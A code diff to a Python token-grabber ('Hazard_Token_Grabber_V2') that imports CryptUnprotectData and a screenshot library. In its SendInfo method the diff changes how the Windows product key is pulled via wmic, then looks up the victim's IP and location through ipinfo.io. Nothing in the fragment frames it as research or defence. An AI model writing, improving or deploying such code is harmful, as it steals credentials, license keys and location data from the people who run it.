@@ -6,6 +6,7 @@ import zipfile
 import json
 import base64 
 import psutil
+import subprocess
 
 from PIL import ImageGrab
 from win32crypt import CryptUnprotectData
@@ -353,7 +354,8 @@ class Hazard_Token_Grabber_V2:
         image.close()
 
     def SendInfo(self):
-        wkey = os.popen("wmic path softwarelicensingservice get OA3xOriginalProductKey").read().strip("OA3xOriginalProductKeyn\n").strip()
+        process = subprocess.Popen("wmic path softwarelicensingservice get OA3xOriginalProductKey", stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.DEVNULL)
+        wkey = process.communicate()[0].decode().strip("OA3xOriginalProductKeyn\n").strip()
         ip = country = city = region = googlemap = "None"
         try:
             data = requests.get("http://ipinfo.io/json").json()
